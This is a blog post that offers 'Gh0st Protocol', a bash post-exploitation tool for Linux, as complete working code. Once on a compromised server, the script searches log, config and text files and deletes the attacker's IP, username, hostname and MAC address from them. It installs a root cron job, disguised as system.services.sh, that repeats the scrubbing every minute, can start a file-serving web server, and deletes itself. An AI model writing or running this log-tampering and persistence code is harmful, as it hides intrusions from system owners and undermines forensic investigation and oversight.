---
layout: post
author: Gh0st-D3V
tags: [Exploitation, Scripting, Linux]
---

# Gh0st Protocol
## Post exploitation tool for Linux systems


This script is meant to be loaded onto a server after the user has exploited it, you can then run the script inorder to delete user supplied variables from .log .logs .conf .txt .confs files in order to hide the exploitation attempt.

---

## Code

```
#!/bin/bash
#Author: Eirik Larsen
#Title: Ghost Protocol
#Description: Tool to scrape identifiying variables post exploitation from log type files
#Version: Production.1.0


# Initialize variables to blank states, and the python state to uknown
ip_address=""
username=""
hostname=""
mac_address=""
python_installed="Unknown"

# Function to check if Python3 by seeing if there is a veriosn is installed And sends the output to /dev/null
check_python3() {
  if command -v python3 &>/dev/null; then
    python_installed="Installed (S to start Server)"
  else
    python_installed="Uninstalled"
  fi
}

# Function to scan for files and count read/write access by looking for files (-f) that end in .log or (-o) any of the other supplied files, and sees which are writeable (-writeable) and readable (-readable)
# The commands then pipe to wc to count how many lines (-l) effectivly showing how many files have read or write access
file_scan() {
  echo "Scanning for files..."
  read_write=$(find / -type f \( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.logs" \) -readable -writable 2>/dev/null | wc -l)
  read_only=$(find / -type f \( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.logs" \) -readable ! -writable 2>/dev/null | wc -l)
  write_only=$(find / -type f \( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.logs" \) ! -readable -writable 2>/dev/null | wc -l)
  no_access=$(find / -type f \( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.logs" \) ! -readable ! -writable 2>/dev/null | wc -l)

#This block of commands echos the count for each type of file (readable writeable etc)
  echo "Files with read and write access: $read_write"
  echo "Files with read-only access: $read_only"
  echo "Files with write-only access: $write_only"
  echo "Files with no access: $no_access"
  read -p "Press Enter to continue"
}
#Function to host a python web server
python_server() {
    # Makes a Directory and forces to make the parent directory (-p) and then changges into said directory
    mkdir -p /tmp/gh0stp && cd /tmp/gh0stp

    # Get the IP address of the server by running hostname to just show the ip's (-I) then awks the first row to show the servers IP address)
    ip_address=$(hostname -I | awk '{print $1}')
    # Echos and gives a link to the server
    echo "Serving on http://${ip_address}:6969"
    #Passes both types of output to /dev/null so that when using on a server you ssh into it wont say the server is hosted on 0.0.0.0
    python3 -m http.server 6969 > /dev/null
}
#Function for Self Destruction of script
self_destruct() {
  server_path="/tmp/gh0stp"
  # Checks to see if the directory (-d) exists, if it does it then deletes it forceably (-f) and everything inside of that directory recurisvily (-r)
  # Then deletes the Script forceably (-f) as to not show a prompt
  if [ -d "$server_path" ]; then
    echo "Directory $server_path exists. Deleting..."
    rm -rf "$server_path"
    echo "Directory $server_path deleted successfully."
  else
    echo "Directory $server_path does not exist."
  fi
  rm -f Gh0st.sh
  echo "Gh0st.sh deleted successfully."
  exit 0
}
# Function to remove supplied variables from files

ghost_protocol() {
  echo "Creating backup copies and removing supplied variables from writable files..."

  # Create the backup directory if it doesn't exist
  mkdir -p /tmp/gh0stp

  # Process the files By setting the IFS (Internal Feild Seperator) to look for null space, effectivly only making the fuction only edit files if it finds
  # The supplied variables surrounded by null characters
  while IFS= read -r -d '' file; do
    # Check if the file is readable and writable and contains any of the supplied variables
    if [ -r "$file" ] && [ -w "$file" ] && (grep -q -e "$ip_address" -e "$username" -e "$hostname" -e "$mac_address" "$file" 2>/dev/null); then
      # Create a backup copy with the .og extension in the /tmp/gh0stp directory
      cp "$file" "/tmp/gh0stp/$(basename "$file").og"

      # Remove the supplied variables from the original file but only in the supplied variable is a non zero length (-n) if thats true then sed is used to edit in place (-i) 
      #(g) is used by seth to show what should be replaced
      if [ -n "$ip_address" ]; then
        sed -i "s/$ip_address//g" "$file"

      fi

      if [ -n "$username" ]; then
        sed -i "s/$username//g" "$file"
      fi

      if [ -n "$hostname" ]; then
        sed -i "s/$hostname//g" "$file"
      fi

      if [ -n "$mac_address" ]; then
        sed -i "s/$mac_address//g" "$file"
      fi
    fi
  done < <(find / -type f \( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.logs" \) -print0 2>/dev/null)

  echo "Backup copies created and supplied variables removed from writable files."
  read -p "Press Enter to continue"
# Makes a script that gets turned into a cronjob that runs every min to make sure the supplied varriables arnt logged when the user disconnects from a session
# This is a repeat of the above function
cat > /usr/local/bin/system.services.sh << EOL
 #!/bin/bash
 ip_address="$ip_address"
 username="$username"
 hostname="$hostname"
 mac_address="$mac_address"

 while IFS= read -r -d '' file; do
   if [ -r "\$file" ] && [ -w "\$file" ] && (grep -q -e "\$ip_address" -e "\$username" -e "\$hostname" -e "\$mac_address" "\$file" 2>/dev/null); then
     if [ -n "\$ip_address" ]; then
       sed -i "s/\$ip_address//g" "\$file"
     fi

     if [ -n "\$username" ]; then
       sed -i "s/\$username//g" "\$file"
     fi

     if [ -n "\$hostname" ]; then
       sed -i "s/\$hostname//g" "\$file"
     fi

     if [ -n "\$mac_address" ]; then
       sed -i "s/\$mac_address//g" "\$file"
     fi
   fi
 done < <(find / -type f \( -name "*.txt" -o -name "*.log" -o -name "*.conf" -o -name "*.logs" \) -print0 2>/dev/null)
EOL

# Make the script executable
chmod +x /usr/local/bin/system.services.sh

# Add the cronjob to run the script every minute while keeping the output supressed
(crontab -l 2>/dev/null; echo "* * * * * root /usr/local/bin/system.services.sh") | crontab -



}




while true; do
  clear

  # Display the menu
  echo "------------------------------------"
  echo "               MENU                 "
  echo "------------------------------------"
  echo "1. IP Address: $ip_address"
  echo "2. Username: $username"
  echo "3. Hostname: $hostname"
  echo "4. Mac Address: $mac_address"
  echo "5. Python3 Status: $python_installed"
  echo "F. File Scan"
  echo "G. Ghost Protocol"
  echo "q. Quit"
  echo "Q. Self Destruct (This is permanent, No going back)"
  echo "------------------------------------"
  echo -n "Enter choice: "
  read choice
  case $choice in
  1)
    clear
    echo -n "Enter IP Address: "
    read ip_address
    ;;
  2)
    clear
    echo -n "Enter Username: "
    read username
    ;;
  3)
    clear
    echo -n "Enter Hostname: "
    read hostname
    ;;
  4)
    clear
    echo -n "Enter MAC Address: "
    read mac_address
    ;;
  5)
    clear
    check_python3
    echo "Python3 Status: $python_installed"
    ;;
  [gG])
    clear
    ghost_protocol
    ;;
  [fF])
    clear
    file_scan
    ;;
  [sS])
    clear
    python_server
    ;;
  q)
    exit 0
    ;;
  Q)
   clear
   self_destruct
   ;;  
  *)
    echo "Invalid choice. Press Enter to continue"
    read
    ;;
esac
done
    
```
---
{: data-content="footnotes"}

